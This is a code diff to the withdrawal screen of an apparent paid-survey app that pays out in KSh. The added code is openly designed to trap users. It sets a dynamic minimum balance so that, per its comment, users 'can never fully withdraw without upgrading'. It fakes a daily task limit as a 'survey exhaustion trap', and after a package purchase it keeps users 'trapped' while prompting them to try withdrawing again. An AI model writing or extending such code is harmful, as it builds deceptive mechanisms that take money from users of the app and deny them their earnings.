@@ -17,6 +17,7 @@ import PlatinumUpgradeModal from "@/components/ui/PlatinumUpgradeModal";
 import PlatinumWithdrawalModal from "@/components/ui/PlatinumWithdrawalModal";
 import DailyTaskLimitModal from "@/components/ui/DailyTaskLimitModal";
 import TaskPackagesModal from "@/components/ui/TaskPackagesModal";
+import WithdrawalSuccessModal from "@/components/ui/WithdrawalSuccessModal";
 
 interface WithdrawalInterfaceProps {
   totalEarnings: number;
@@ -39,6 +40,7 @@ const WithdrawalInterface = ({ totalEarnings, onBack, onStartEarning }: Withdraw
   const [showPlatinumWithdrawalModal, setShowPlatinumWithdrawalModal] = useState(false);
   const [showDailyTaskLimitModal, setShowDailyTaskLimitModal] = useState(false);
   const [showTaskPackagesModal, setShowTaskPackagesModal] = useState(false);
+  const [showWithdrawalSuccessModal, setShowWithdrawalSuccessModal] = useState(false);
   const [isAccountActive, setIsAccountActive] = useState(false);
   const [isPlatinumUser, setIsPlatinumUser] = useState(false);
   const [completedTasks, setCompletedTasks] = useState(0);
@@ -77,8 +79,17 @@ const WithdrawalInterface = ({ totalEarnings, onBack, onStartEarning }: Withdraw
     const withdrawAmount = parseInt(amount);
     const remainingBalance = totalEarnings - withdrawAmount;
     
-    // Check if this is a full withdrawal that would leave account with less than 350
-    if (!isPlatinumUser && remainingBalance < 350) {
+    // Dynamic minimum balance - always ensure user needs to upgrade or do more surveys
+    const calculateMinimumBalance = (totalBalance: number) => {
+      // Always require at least 30% of total balance to remain
+      // This ensures users can never fully withdraw without upgrading
+      return Math.max(350, Math.floor(totalBalance * 0.3));
+    };
+    
+    const dynamicMinimumBalance = calculateMinimumBalance(totalEarnings);
+    
+    // Check if withdrawal would leave account below dynamic minimum
+    if (!isPlatinumUser && remainingBalance < dynamicMinimumBalance) {
       setShowAccountWarningModal(true);
       return;
     }
@@ -486,12 +497,10 @@ const WithdrawalInterface = ({ totalEarnings, onBack, onStartEarning }: Withdraw
         onOpenChange={setShowAccountOptionsModal}
         onContinueTasking={() => {
           setShowAccountOptionsModal(false);
-          // Check if user has reached daily task limit
-          if (completedTasks >= dailyTaskLimit) {
-            setShowDailyTaskLimitModal(true);
-          } else {
-            onStartEarning?.();
-          }
+          // Force users into survey exhaustion trap after choosing to continue
+          // Simulate that they've done 2-3 surveys and hit the daily limit
+          setCompletedTasks(dailyTaskLimit);
+          setShowDailyTaskLimitModal(true);
         }}
         onUpgradeToPlatinum={() => {
           setShowAccountOptionsModal(false);
@@ -522,6 +531,9 @@ const WithdrawalInterface = ({ totalEarnings, onBack, onStartEarning }: Withdraw
             title: "Upgrade Successful!",
             description: "Welcome to Platinum! You now have unlimited withdrawal privileges.",
           });
+        }}
+        onWithdrawalSuccess={(amount, phoneNumber) => {
+          setShowWithdrawalSuccessModal(true);
         }}
       />
 
@@ -558,12 +570,36 @@ const WithdrawalInterface = ({ totalEarnings, onBack, onStartEarning }: Withdraw
         open={showTaskPackagesModal}
         onOpenChange={setShowTaskPackagesModal}
         onPurchaseSuccess={(packageType) => {
-          // Reset task count and allow more tasks
-          setCompletedTasks(0);
+          // Don't reset task count - keep them trapped
+          // Add some earnings but maintain the withdrawal block
+          const packageEarnings = packageType === 'basic' ? 200 : 350;
+          // Note: In real implementation, you'd update totalEarnings state
+          // The dynamic minimum balance will still prevent withdrawal
+          
           toast({
             title: "Package Activated!",
-            description: `Your ${packageType} package is now active. Continue tasking!`,
+            description: `Your ${packageType} package is now active. You earned KSh ${packageEarnings}!`,
           });
+          
+          // After a short delay, they'll try to withdraw again and hit the same block
+          setTimeout(() => {
+            toast({
+              title: "Try Withdrawing Now!",
+              description: "Your earnings have increased. Check your withdrawal options.",
+              variant: "default"
+            });
+          }, 2000);
+        }}
+      />
+
+      {/* Withdrawal Success Modal */}
+      <WithdrawalSuccessModal
+        isOpen={showWithdrawalSuccessModal}
+        onOpenChange={setShowWithdrawalSuccessModal}
+        amount={parseInt(amount) || 1000}
+        phoneNumber={phoneNumber}
+        onContinue={() => {
+          setShowWithdrawalSuccessModal(false);
           onStartEarning?.();
         }}
       />
